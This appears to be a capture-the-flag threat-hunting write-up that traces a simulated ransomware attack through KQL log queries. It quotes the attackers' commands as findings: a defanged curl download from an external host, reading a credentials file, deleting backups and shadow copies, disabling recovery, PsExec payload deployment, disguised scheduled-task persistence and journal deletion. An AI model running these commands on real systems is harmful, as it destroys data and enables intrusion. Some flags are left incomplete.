## Azuki Import/Export - 梓貿易株式会社 Incident Report
- **Date of Report**: 2026-03-12
- **Incident Date:**  2025-11-27
- **Severity Level**:  [] LOW  [] MEDIUM  [] HIGH  [X] CRITICAL 
- **ENVIRONMENT:** Azuki Logistics Corporate Network
- **Incident ID:**
- **Tools**: Log Analytics Workspace
- **Starting Point:** `DeviceProcessEvents  | where DeviceName contains "azuki"`

### Scenario
 It's been a week since the initial compromise. You arrive Monday morning to find ransom notes across every system. The threat actors weren't just stealing data - they were preparing for total devastation.
 
### **PHASE 1: LINUX BACKUP SERVER COMPROMISE (FLAGS 1-12)**
---------
#### **FLAG 1: LATERAL MOVEMENT - Remote Access**
- **Findings:** Attackers pivot to critical infrastructure to eliminate recovery options before deploying ransomware.
- Reference: [T1021.004: Remote Services - SSH](https://attack.mitre.org/techniques/T1021/004/)
- `"ssh.exe" backup-admin@10.1.0.189`

**KQL Query: SSH Usage**
```SQL
DeviceProcessEvents
| where ProcessCommandLine contains "ssh.exe"
| where FileName contains "ssh"
| project Timestamp, AccountName, FileName, FolderPath, ProcessCommandLine
| sort by Timestamp asc
```
<img width="818" height="165" alt="Pasted image 20260312071954" src="https://github.com/user-attachments/assets/77e3c6f4-b469-4bcc-91e7-8af9f71bc893" />




----------
#### **FLAG 2: LATERAL MOVEMENT - Attack Source**
- Findings: Identifying the attack source enables network segmentation and containment.
- Reference: [T1021.004: Remote Services - SSH](https://attack.mitre.org/techniques/T1021/004/)
- IP Address: `10.1.0.108`

**KQL Query: Find Attacker's IP**

```SQL
DeviceLogonEvents
| where AccountName  contains "backup-admin"
| where ActionType has "LogonSuccess"
| where isnotempty( RemoteIP)
| where Timestamp > todatetime('2025-11-25T05:39:10.889728Z')
| project Timestamp, DeviceName, AccountName,RemoteIP, RemotePort, ActionType, InitiatingProcessCommandLine, IsLocalAdmin, LogonType, Protocol
| sort by Timestamp asc
```
<img width="1046" height="203" alt="Pasted image 20260312075206" src="https://github.com/user-attachments/assets/1c32ec55-b9fb-48fb-a281-974dd62955cf" />


---------
#### **FLAG 3: CREDENTIAL ACCESS - Compromised Account**
- Findings: Administrative accounts with backup privileges provide access to critical recovery infrastructure.
- Reference: [T1078.002: Valid Accounts - Domain Accounts](https://attack.mitre.org/techniques/T1078/002/)
- `backup-admin`

KQL Query:

Go back and modify yhe query

-----------
####  **FLAG 4: DISCOVERY - Directory Enumeration**
- Findings: File system enumeration reveals backup locations and valuable targets for destruction.
- Reference: [T1083: File and Directory Discovery](https://attack.mitre.org/techniques/T1083/)  
- `ls --color=auto -la /backups/`

**KQL Query: List Commands Ran using the ls (list contents of a directory) Command**
```SQL
DeviceProcessEvents
| where DeviceName has "azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net"
| where AccountName == "backup-admin"
| where isnotempty( ProcessCommandLine)
| where ProcessCommandLine has "ls"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| sort by Timestamp asc
```
<img width="839" height="354" alt="Pasted image 20260312081312" src="https://github.com/user-attachments/assets/bfa23d44-cd79-4e8c-8f66-c52322f7b7b2" />


----------
#### **FLAG 5: DISCOVERY - File Search**
- Findings: Attackers search for specific file types to identify high-value targets.
- Reference: [T1083: File and Directory Discovery](https://attack.mitre.org/techniques/T1083/)  
- `find /backups -name *.tar.gz`

**KQL Query: Find All files with gzip extension**
```SQL
DeviceProcessEvents
| where DeviceName has "azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net"
| where AccountName == "backup-admin"
| where isnotempty( ProcessCommandLine)
| where ProcessCommandLine has ".gz"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| sort by Timestamp asc
```
<img width="713" height="151" alt="Pasted image 20260312081615" src="https://github.com/user-attachments/assets/31d09c50-17ec-4783-a175-1c44f6fc1622" />

----------

#### **FLAG 6: DISCOVERY - Account Enumeration**
- Findings: Attackers enumerate local accounts to understand the system's user base.
- Reference: [T1087.001: Account Discovery - Local Account](https://attack.mitre.org/techniques/T1087/001/)  
- xxxxxxxxxxxxx

```SQL
DeviceProcessEvents
| where DeviceName has "azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net"
| where isnotempty( ProcessCommandLine)
| where ProcessCommandLine contains "/passwd"
| project Timestamp, DeviceName, AccountName, FolderPath, ProcessCommandLine
| sort by Timestamp asc
```
<img width="788" height="166" alt="Pasted image 20260312082902" src="https://github.com/user-attachments/assets/3e3345f2-bf09-48f9-a05a-62aa6235539f" />


-----------
#### **FLAG 7: DISCOVERY - Scheduled Job Reconnaissance**
- Findings: Understanding backup schedules helps attackers time their destruction for maximum impact.
- Reference: [T1083: File and Directory Discovery](https://attack.mitre.org/techniques/T1083/)  
- ``cat /etc/crontab``


```SQL
DeviceProcessEvents
| where DeviceName has "azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net"
| where isnotempty( ProcessCommandLine)
| where ProcessCommandLine contains "crontab"
| project Timestamp, DeviceName, AccountName, FolderPath, ProcessCommandLine
| sort by Timestamp asc
```
<img width="858" height="94" alt="Pasted image 20260312083320" src="https://github.com/user-attachments/assets/6b2c82be-6df5-4d9f-ab94-1e2d2bb1dc3a" />


----------
#### **FLAG 8: COMMAND AND CONTROL - Tool Transfer**
- Findings: Attackers download tools from external infrastructure to carry out the attack.
- Reference: [T1105: Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)  
- `hxxps[://]litter[.]catbox[.]moe`
- `curl -L -o destroy.7z hxxps[://]litter[.]catbox[.]moe/io523y[.]7z`
- https://www.virustotal.com/gui/url/d12a94f339b357c09e832e5739eae474e2c24dfcd18c9c822ec09f2c917010bb?nocache=1

```SQL
DeviceProcessEvents
| where DeviceName has "azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net"
| where isnotempty( ProcessCommandLine)
| where ProcessCommandLine contains "curl"
| project Timestamp, DeviceName, AccountName, FolderPath, ProcessCommandLine
| sort by Timestamp asc
```
<img width="860" height="162" alt="Pasted image 20260312223230" src="https://github.com/user-attachments/assets/66f6287f-eb20-4008-b725-cbb9a5c9cb86" />

----------
#### **FLAG 9: CREDENTIAL ACCESS - Credential Theft**
- Findings: Backup servers often store sensitive configuration files containing credentials.
- Reference: [T1552.001: Unsecured Credentials - Credentials In Files](https://attack.mitre.org/techniques/T1552/001/)
- `cat /backups/configs/all-credentials.txt`

```SQL
DeviceProcessEvents
| where DeviceName has "azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net"
| where isnotempty( ProcessCommandLine)
| where ProcessCommandLine contains "cred"
| project Timestamp, DeviceName, AccountName, FolderPath, ProcessCommandLine
| sort by Timestamp asc
```
<img width="1059" height="227" alt="Pasted image 20260312173218" src="https://github.com/user-attachments/assets/13b88055-9b42-45a7-9c3c-147f501b547b" />


-------------
#### **FLAG 10: IMPACT - Data Destruction**
- Findings: Destroying backups eliminates recovery options and maximizes ransomware impact.
- Reference: [T1485: Data Destruction](https://attack.mitre.org/techniques/T1485/)  
- `rm -rf /backups/archives`

```SQL
DeviceProcessEvents
| where DeviceName has "azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net"
| where isnotempty(ProcessCommandLine)
| where FolderPath == "/usr/bin/rm"
| where ProcessCommandLine contains "backups"
| project Timestamp, DeviceName, AccountName, FolderPath, ProcessCommandLine
| sort by Timestamp asc

```

--------
#### **FLAG 11: IMPACT - Service Stopped**
- Findings: Stopping services takes effect immediately but does NOT survive a reboot.
- Reference: [T1489: Service Stop](https://attack.mitre.org/techniques/T1489/)  
- `systemctl stop cron`

```SQL
DeviceProcessEvents
| where DeviceName has "azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net"
| where isnotempty(ProcessCommandLine)
| where FolderPath contains "systemctl"
| where ProcessCommandLine contains "stop"
| project Timestamp, DeviceName, AccountName, FolderPath, ProcessCommandLine
| sort by Timestamp asc
```
<img width="752" height="183" alt="Pasted image 20260312142734" src="https://github.com/user-attachments/assets/06220a6d-a8e6-4e5d-af96-40cbef92fed4" />


--------
#### **FLAG 12: IMPACT - Service Disabled**
- Findings: Disabling a service prevents it from starting at boot - this SURVIVES a reboot.
- Reference: [T1489: Service Stop](https://attack.mitre.org/techniques/T1489/)  
- `systemctl disable cron`

```SQL
DeviceProcessEvents
| where DeviceName has "azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net"
| where isnotempty(ProcessCommandLine)
| where FolderPath contains "systemctl"
| where ProcessCommandLine contains "disable"
| project Timestamp, DeviceName, AccountName, FolderPath, ProcessCommandLine
| sort by Timestamp asc
```
<img width="822" height="184" alt="Pasted image 20260312143828" src="https://github.com/user-attachments/assets/bbd37cdf-5465-46b3-bbc1-32dcf83c3734" />


------
### **PHASE 2: WINDOWS RANSOMWARE DEPLOYMENT (FLAGS 13-15)**  
#### **FLAG 13: LATERAL MOVEMENT - Remote Execution**
- Findings: Remote administration tools enable attackers to deploy malware across multiple systems simultaneously.
- Reference: [T1021.002: SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002/)  
- `PsExec64.exe`

```SQL
DeviceProcessEvents
| where ProcessCommandLine contains "PsExec"
| where FileName contains "PsExec"
| project Timestamp, AccountName, FileName, FolderPath, ProcessCommandLine
| sort by Timestamp asc
```
<img width="1149" height="121" alt="Pasted image 20260312150146" src="https://github.com/user-attachments/assets/0f501ecc-27a9-4a93-8e52-8391f4124264" />


------
#### **FLAG 14: LATERAL MOVEMENT - Deployment Command**
- Findings: Full command lines reveal target systems, credentials, and deployed payloads.
- Reference: [T1021.002: SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002/)  

- `"PsExec64.exe" \\10.1.0.102 -u kenji.sato -p ********** -c -f C:\Windows\Temp\cache\silentlynx.exe`
- `"PsExec64.exe" \\10.1.0.188 -u fileadmin -p ********** -c -f C:\Windows\Temp\cache\silentlynx.exe`
- `"PsExec64.exe" \\10.1.0.204 -u kenji.sato -p ********** -c -f C:\Windows\Temp\cache\silentlynx.exe`

-----------
#### **FLAG 15: EXECUTION - Malicious Payload**
- Finding: Identifying the payload enables threat hunting across the environment.
- **Reference:** [T1204.002: User Execution - Malicious File](https://attack.mitre.org/techniques/T1204/002/)
- `silentlynx.exe`

--------
### **PHASE 3: RECOVERY INHIBITION (FLAGS 16-22)**  
#### **FLAG 16: IMPACT - Shadow Service Stopped**
- Findings: Ransomware stops backup services to prevent recovery during encryption.
- Reference: [T1490: Inhibit System Recovery](https://attack.mitre.org/techniques/T1490/)  
- `"net" stop VSS /y`
```SQL
DeviceProcessEvents
| where ProcessCommandLine contains "net" and ProcessCommandLine contains "vss"
| project Timestamp, AccountName, FileName, FolderPath, ProcessCommandLine
| sort by Timestamp asc

```

<img width="781" height="114" alt="Pasted image 20260312152936" src="https://github.com/user-attachments/assets/e3c7a6c7-7d75-4ea4-aa9a-539834b854f0" />


-------
#### **FLAG 17: IMPACT - Backup Engine Stopped**
- Findings: Stopping backup engines prevents backup operations during the attack.
- Reference: [T1490: Inhibit System Recovery](https://attack.mitre.org/techniques/T1490/)
- `"net" stop wbengine /y`


```SQL
DeviceProcessEvents
| where ProcessCommandLine contains "wbengine" 
| project Timestamp, AccountName, FileName, FolderPath, ProcessCommandLine
| sort by Timestamp asc
```
<img width="783" height="159" alt="Pasted image 20260312162402" src="https://github.com/user-attachments/assets/1ba303ee-01b9-4ece-9e35-9edf2a90b44e" />


--------
#### **FLAG 18: DEFENSE EVASION - Process Termination**
- Finding: Certain processes lock files and must be terminated before encryption can succeed.
- Reference: [T1562.001: Impair Defenses - Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001/)  


```SQL
DeviceProcessEvents
| where AccountName <> "system"
| where ProcessCommandLine contains "taskkill" 
| project Timestamp, AccountName, FileName, FolderPath, ProcessCommandLine
| sort by Timestamp asc

```
<img width="906" height="231" alt="Pasted image 20260312163115" src="https://github.com/user-attachments/assets/75496729-fdce-4dbe-9865-9e0e1e1a61ff" />


-------
#### **FLAG 19: IMPACT - Recovery Point Deletion**
- Finding: Recovery points enable rapid file recovery without external backups.
- Reference: [T1490: Inhibit System Recovery](https://attack.mitre.org/techniques/T1490/)  
- `"vssadmin.exe" delete shadows /all /quiet`

```SQL
DeviceProcessEvents
| where ProcessCommandLine contains "vssadmin" 
| where ProcessCommandLine contains "delete" 
| project Timestamp, AccountName, FileName, FolderPath, ProcessCommandLine
| sort by Timestamp asc
```
<img width="886" height="92" alt="Pasted image 20260312163648" src="https://github.com/user-attachments/assets/64b7ae86-904d-4eab-8290-20e70be714a7" />


--------------
#### **FLAG 20: IMPACT - Storage Limitation**
- Finding: Limiting storage prevents new recovery points from being created.
- Reference: [T1490: Inhibit System Recovery](https://attack.mitre.org/techniques/T1490/)
- `"vssadmin.exe" resize shadowstorage /for=C: /on=C: /maxsize=401MB`

```SQL
DeviceProcessEvents
| where ProcessCommandLine contains "vssadmin" 
| where ProcessCommandLine contains "resize" 
| project Timestamp, AccountName, FileName, FolderPath, ProcessCommandLine
| sort by Timestamp asc
```
<img width="981" height="94" alt="Pasted image 20260312164539" src="https://github.com/user-attachments/assets/890d165a-ad0d-4761-b620-f9850faff2e1" />

---------
#### **FLAG 21: IMPACT - Recovery Disabled**
- Finding: Windows recovery features enable automatic system repair after corruption.
- Reference: [T1490: Inhibit System Recovery](https://attack.mitre.org/techniques/T1490/)  
- `"bcdedit" /set {default} recoveryenabled No`

```SQL
DeviceProcessEvents
| where ProcessCommandLine contains "bcdedit" 
| where ProcessCommandLine contains "recovery" 
| project Timestamp, AccountName, FileName, FolderPath, ProcessCommandLine
| sort by Timestamp asc

```
<img width="1198" height="91" alt="Pasted image 20260312165230" src="https://github.com/user-attachments/assets/7adc96ac-ed99-4286-9b60-ff008b35e186" />


-----------
#### **FLAG 22: IMPACT - Catalog Deletion**
- Finding: Backup catalogues track available restore points and backup versions.
- Reference: [T1490: Inhibit System Recovery](https://attack.mitre.org/techniques/T1490/)
- `"wbadmin" delete catalog -quiet`

```SQL
DeviceProcessEvents
| where ProcessCommandLine contains "wbadmin" 
| project Timestamp, AccountName, FileName, FolderPath, ProcessCommandLine
| sort by Timestamp asc
```
<img width="810" height="74" alt="Pasted image 20260312165858" src="https://github.com/user-attachments/assets/6f845e05-c914-4ef4-9f92-93292097ac04" />

---------
### PHASE 4: PERSISTENCE (FLAGS 23-24)  
#### FLAG 23: PERSISTENCE - Registry Autorun
- Finding: Registry keys can execute programs automatically at system startup.
- Reference: [T1547.001: Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001/)  
- `silentlynx.exe`

```SQL
DeviceRegistryEvents
| where isnotempty( RegistryKey)
| where isnotempty(RegistryValueName)
| where RegistryKey contains "\\CurrentVersion\\Run"
| where InitiatingProcessFileName contains "silentlynx.exe" 
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, RegistryValueName, RegistryKey, ActionType
| sort by Timestamp asc
```
<img width="1059" height="227" alt="Pasted image 20260312173218" src="https://github.com/user-attachments/assets/f5326b17-5a06-4228-b211-c34d017d3d8b" />


---------
#### **FLAG 24: PERSISTENCE - Scheduled Execution**
- Findings: Scheduled jobs provide reliable persistence with configurable triggers.
- References:  [T1053.005: Scheduled Task/Job](https://attack.mitre.org/techniques/T1053/005/)  
- `Microsoft\Windows\Security\SecurityHealthService`
- `"schtasks" /create /tn "Microsoft\Windows\Security\SecurityHealthService" /tr "C:\Windows\Temp\cache\silentlynx.exe" /sc onlogon /rl highest /f`

```SQL
DeviceProcessEvents
| where DeviceName contains "azuki"
| where isnotempty( ProcessCommandLine)
| where ProcessCommandLine contains "schtasks"
| project Timestamp, DeviceName, AccountName, FolderPath, InitiatingProcessVersionInfoInternalFileName, ProcessCommandLine
| sort by Timestamp asc
```
<img width="1453" height="208" alt="Pasted image 20260312174606" src="https://github.com/user-attachments/assets/d26fe377-e546-40b5-b190-769f1f30f79a" />


------------
### PHASE 5: ANTI-FORENSICS (FLAG 25)  
#### FLAG 25: DEFENSE EVASION - Journal Deletion
- Finding: File system journals track changes and are valuable for forensic analysis.
- Reference: [T1070.004: Indicator Removal on Host - File Deletion](https://attack.mitre.org/techniques/T1070/004/)
- `"fsutil.exe" usn deletejournal /D C:`


```SQL
DeviceProcessEvents
| where DeviceName contains "azuki"
| where isnotempty( ProcessCommandLine)
| where ProcessCommandLine contains "fsutil"
| project Timestamp, DeviceName, AccountName, FolderPath, InitiatingProcessVersionInfoInternalFileName, ProcessCommandLine
| sort by Timestamp asc
```
<img width="977" height="185" alt="Pasted image 20260312175135" src="https://github.com/user-attachments/assets/be0d848d-6db4-43d8-be3f-c6d7e9efe257" />


----------
### PHASE 6: RANSOMWARE SUCCESS (FLAG 26)  
#### **FLAG 26: IMPACT - Ransom Note**
- Finding: Ransom notes communicate payment instructions and indicate successful encryption.
- Reference:" [T1486: Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486/)
- 

```SQL
DeviceProcessEvents
| where DeviceName contains "azuki"
| where isnotempty( ProcessCommandLine)
| where ProcessCommandLine contains ".txt"
| project Timestamp, DeviceName, AccountName, FolderPath, InitiatingProcessVersionInfoInternalFileName, ProcessCommandLine
| sort by Timestamp asc
```
<img width="1189" height="281" alt="Pasted image 20260312175714" src="https://github.com/user-attachments/assets/4c26a3e1-cc1d-48ad-a250-106628278063" />

